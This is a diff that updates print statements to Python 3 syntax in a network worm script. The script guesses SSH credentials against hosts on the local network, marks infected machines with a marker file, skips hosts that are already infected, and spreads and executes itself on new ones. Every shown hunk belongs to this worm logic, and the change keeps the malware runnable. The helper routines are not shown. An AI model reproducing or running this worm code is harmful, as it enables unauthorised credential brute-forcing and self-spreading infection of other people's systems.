@@ -151,13 +151,13 @@ def attackSystem(host):
 		# instance of the SSH connection
 		# to the remote system. 
 		if tryCredentials(host, username, password, ssh) == 0:
-			print "Success with " + host + " " +  username + " " + password
+			print ("Success with " + host + " " +  username + " " + password)
 			return (ssh, username, password)
 		elif tryCredentials(host, username, password, ssh) == 1:
-			print "Wrong Credentials on host " + host
+			print ("Wrong Credentials on host " + host)
 			continue
 		elif tryCredentials(host, username, password, ssh) == 3:
-			print "No SSH client on " + host
+			print ("No SSH client on " + host)
 			break #no ssh client so just stop
 	# Could not find working credentials
 	return None	
@@ -225,7 +225,7 @@ networkHosts = getHostsOnTheSameNetwork()
 if not os.path.exists(INFECTED_MARKER_FILE):
 	markInfected()
 else:
-	print "Already Infected"
+	print ("Already Infected")
 	sys.exit()
 
 # Go through the network hosts
@@ -240,12 +240,12 @@ for host in networkHosts:
 	# Did the attack succeed?
 	if sshInfo:
 		
-		print "Trying to spread"
+		print ("Trying to spread")
 	 	if isInfectedSystem(sshInfo[0]) == True:
-			print "Remote System is Infected"
+			print ("Remote System is Infected")
 			continue
 		else:
 			spreadAndExecute(sshInfo[0])
-			print "Spreading complete on " + host	
+			print ("Spreading complete on " + host)
 			sys.exit()	
 	
